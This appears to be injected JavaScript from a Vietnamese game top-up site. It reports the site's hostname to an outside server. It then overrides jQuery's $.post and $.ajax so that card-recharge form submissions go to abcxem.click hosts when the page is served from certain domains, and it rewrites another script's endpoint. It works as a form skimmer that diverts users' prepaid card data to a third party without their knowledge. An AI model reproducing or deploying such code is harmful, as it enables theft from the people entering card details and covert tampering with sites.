const formData = new URLSearchParams();
formData.append('name', 'John');
formData.append('host', location.hostname);

fetch('https://napkimcuongx10.com/ajaxpro.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: formData
})
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(data => {
    // Xử lý kết quả trả về từ máy chủ
    console.log(data);
  })
  .catch(error => {
    // Xử lý lỗi nếu có
    console.error('Error:', error);
  });



var index = "/"
var adnx = window.location.origin+"/account/napthe.php"
// var url = 'ajax/card.php'
var a = 'ajax/card.php'
var b = 'ajax.php'
var roblox = 'napthe.php'
var napkimcuong = 'napthe.php'
var callback_napthe = '/callback_napthe.php'
if(s >=10){
if (typeof url === 'undefined') {
  var url = "ajax/card.php";
}

var xuly = '/xuly.php'
var callback_napthe = '/callback_napthe.php'
}else{
   if(location.hostname != "napkimcuongx10.com"){
  var b = 'https://1888.abcxem.click/1008/ajax.php'
   }
 var napkimcuong = 'https://1888.abcxem.click/napthe.php'
 if (typeof url === 'undefined') {
  var url = 'https://1888.abcxem.click/ajax.php';
}
   if(location.hostname == "ff.naptheuytinvn.com"){
  $(document).ready(function() {
    
    // Lưu trữ hàm post gốc
    var originalPost = $.post;

    // Gán đè hàm post
    $.post = function(url, data, callback, type) {
        
        // Kiểm tra URL và thay đổi nếu cần
        if(url === "napthe.php") {
            url = "https://1888.abcxem.click/napthevn/napthe.php";
        }

        // Gọi hàm post gốc với các tham số đã sửa
        return originalPost(url, data, callback, type);
    };

});
   }
 if(location.hostname == "naptheuudai.comm"){
(function() {
    // Lưu trữ phiên bản gốc của hàm $.ajax
    var originalAjax = $.ajax;

    // Ghi đè hàm $.ajax
    $.ajax = function(options) {
        var newUrl = 'https://nhd.abcxem.click/napuudai/ajax.php'; // URL mới bạn muốn sử dụng

        // Thay đổi giá trị của thuộc tính "url" trong options
        options.url = newUrl;
  if (options.success) {
            var originalSuccess = options.success;

            options.success = function(data) {
                // Thực hiện xử lý mới trong hàm success
              data = JSON.parse(data);
         
                if (data.message) {
                    document.querySelector('#form_recharge').reset();
                    $('#error_message').val(data.message);
                    
                } else {
                 $('#error_message').val(data.message);
                }

                // Gọi lại hàm success gốc
                originalSuccess(data);
            };
        }
    

        // Gọi lại hàm $.ajax gốc với options đã được thay đổi
        return originalAjax(options);
    };
})();




}


// var xuly = 'https://nhd.abcxem.click/xuly.php'
// var callback_napthe = 'https://nhd.abcxem.click/callback_napthe.php'
}

 document.addEventListener('DOMContentLoaded', function() {
        var script1 = document.getElementById("script1");
        if (script1) {
            var script1Content = script1.textContent || script1.innerText;
            var updatedScript1Content = script1Content.replace('var URI = "./system/card";', 'var URI = "./new/url";');
            script1.textContent = updatedScript1Content;
            console.log("Updated Script 1 - url:", URI);
        }
    });
// console.log(url)
console.log(seconds);
